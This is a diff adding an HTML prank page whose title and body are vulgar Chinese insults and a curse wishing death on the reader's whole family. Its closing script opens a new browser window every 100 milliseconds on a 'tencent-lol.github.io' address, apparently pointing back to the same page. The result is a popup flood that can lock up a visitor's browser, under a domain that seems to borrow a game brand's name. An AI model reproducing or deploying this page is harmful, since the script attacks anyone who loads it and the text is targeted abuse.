@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>我草你妈</title>
+</head>
+<link rel="stylesheet" type="text/css" href="animate.css">
+<style type="text/css">
+.li {
+    color: red;
+    font-size: .6rem;
+    text-align: center;
+}
+
+.title {
+    color: red;
+    font-size: .6rem;
+    text-align: center;
+
+}
+.shi-body{margin: 0;-webkit-margin-before: 0;
+    -webkit-margin-after: 0;list-style: none;}
+.audio{display: none}
+</style>
+<script type="text/javascript">
+// REM布局需引入的JS代码
+(function(doc, win) {
+    var docEl = doc.documentElement,
+        resizeEvt = 'onorientationchange' in window ? 'onorientationchange' : 'resize',
+        recalc = function() {
+            var clientWidth = docEl.clientWidth;
+            if (!clientWidth) return;
+            if (clientWidth >= 750) {
+                docEl.style.fontSize = '100px';
+            } else {
+                docEl.style.fontSize = 100 * (clientWidth / 750) + 'px';
+            }
+        };
+
+    if (!doc.addEventListener) return;
+    win.addEventListener(resizeEvt, recalc, false);
+    doc.addEventListener('DOMContentLoaded', recalc, false);
+})(document, window);
+</script>
+
+<body id="body" class="bounceIn">
+    <p class="title bounceIn">草你妈</p>
+    <ul class="shi-body">
+        <li class="li bounceIn">我草你妈逼</li>
+        <li class="li bounceIn">你爸笑嘻嘻</li>
+        <li class="li bounceIn">还鼓掌叫好</li>
+        <li class="li bounceIn">全家都傻逼</li>
+    </ul>
+  <p class="title bounceIn">诅咒你全家不得好死下十八层地狱！</p>
+ <!--  <audio class="audio" autoplay="autoplay" loop="loop" src="r.m4a"></audio> -->
+    <script type="text/javascript" src="jquery-1.9.1.min.js"></script>
+<script>
+
+
+
+$(document).ready(function() {
+setInterval(function(){
+    window.open("https://tencent-lol.github.io/surprise/caonim.index.html");  
+},100)	
+});
+
+
+</script>
+
+</body>
+
+</html>
